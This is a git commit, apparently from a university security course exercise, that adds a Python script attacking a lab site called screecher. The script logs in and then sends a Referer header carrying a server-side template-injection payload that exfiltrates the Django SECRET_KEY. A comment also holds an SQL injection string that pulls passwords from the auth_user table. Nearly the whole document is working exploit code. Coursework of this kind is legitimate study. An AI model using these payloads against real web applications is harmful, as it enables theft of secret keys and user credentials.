8695ea26e92996db6009831b22404a954ef92835
Hamza <s8haanwa@stud.uni-saarland.de>
2018-06-17 14:44:45 +0200

    Attack 8.1 Attacking screecher Template Injection

---
+++ ex8_2.py
@@ -0,0 +1,27 @@
+import requests
+
+def attack(session):
+    # ex'; SELECT password FROM auth_user where username = 'AwesomeUsername
+    url = 'https://www.team0.screecher.de/cash/wallet'
+    referer = "'/>This is secret: {{settings.SECRET_KEY}}<a href='"
+    session.headers.update({'referer':referer})
+
+    response = session.post(url)  # auth=('username', 'secret')
+    success = response.status_code < 400
+    response_text = response.text
+    return response_text
+
+def login(session):
+    url = 'https://www.team0.screecher.de/login'
+    data = { 'user': 'exploit', 'pwd': '123'}
+    response = session.post(url, data) # auth=('username', 'secret')
+    success = response.status_code < 400
+    response_text = response.text
+    return response_text, success
+
+if __name__ == '__main__':
+    user_session = requests.session()
+    response,success = login(user_session)
+    response = attack(user_session)
+
+    print(response)
